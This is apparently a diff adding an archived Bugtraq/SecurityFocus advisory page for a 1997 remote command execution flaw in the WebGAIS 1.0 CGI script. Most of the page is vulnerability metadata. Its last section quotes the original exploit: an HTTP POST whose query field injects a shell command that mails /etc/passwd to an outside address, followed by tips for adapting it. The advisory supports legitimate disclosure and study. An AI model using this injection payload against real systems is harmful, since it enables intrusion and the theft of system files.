@@ -1,0 +1,101 @@
+#SpeeDr00t@Black Falcon<br>#bid2058<p><b><span style="font-size: 18pt;">WEBgais Remote Command Execution Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/2058/info">info</a><br><a href="http://www.securityfocus.com/bid/2058/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/2058/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/2058/solution">solution</a><br><a href="http://www.securityfocus.com/bid/2058/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				2058
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Jul 10 1997 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jul 10 1997 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Posted to BugTraq on July 10, 1997 by Razvan Dragomirescu &lt; drazvan@kappa.ro &gt;
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					WebGAIS Development Team WebGAIS 1.0 B2<br/>
+					
+				
+					WebGAIS Development Team WebGAIS 1.0 B1<br/>
+					
+				
+					WebGAIS Development Team WebGAIS 1.0 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	Exploit details taken directly from the BugTraq post By Razvan Dragomirescu:<br/><br/> telnet target.host 80<br/>POST /cgi-bin/webgais HTTP/1.0<br/>Content-length: 85 (replace this with the actual length of the "exploit" line)<br/><br/>query=';mail+drazvan\@pop3.kappa.ro&lt;/etc/passwd;echo'&amp;output=subject&amp;domain=paragraph<br/><br/> ... But to make it work for your system too, you'll have to add other parameters, like idx_dir and data_type who are required by the script in its original version. Just make a normal query to your WebGais server and see what all the parameters are. But remember to use "output" and "domain" as specified in my exploit. Otherwise you will end up in some other place of the script and nothing will happen.
+	
+		<ul>
+</ul>
+</div>
